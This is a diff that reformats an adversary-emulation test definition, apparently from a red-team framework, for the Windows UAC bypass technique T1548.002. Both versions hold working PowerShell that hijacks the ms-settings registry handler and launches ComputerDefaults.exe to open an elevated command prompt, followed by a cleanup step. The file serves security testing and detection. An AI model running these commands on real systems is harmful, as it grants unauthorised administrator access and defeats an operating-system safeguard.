@@ -1,19 +1,18 @@
-- id: 8fb4bbc3-c65f-57e7-baf2-435b37ed6c00
+- requirements: []
   name: Soumaia ART Tests - Bypass UAC using ComputerDefaults (PowerShell)
   description: 'PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
 
     Upon execution administrative command prompt should open'
   tactic: privilege-escalation
-  technique:
-    attack_id: T1548.002
-    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
-          New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
-          Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
-          Start-Process "C:\Windows\System32\ComputerDefaults.exe"
-        cleanup: |-
-          Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
+  technique_id: T1548.002
+  technique_name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  executors:
+  - cleanup:
+    - Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force; New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force; Start-Process "C:\Windows\System32\ComputerDefaults.exe"
+  id: 8fb4bbc3-c65f-57e7-baf2-435b37ed6c00
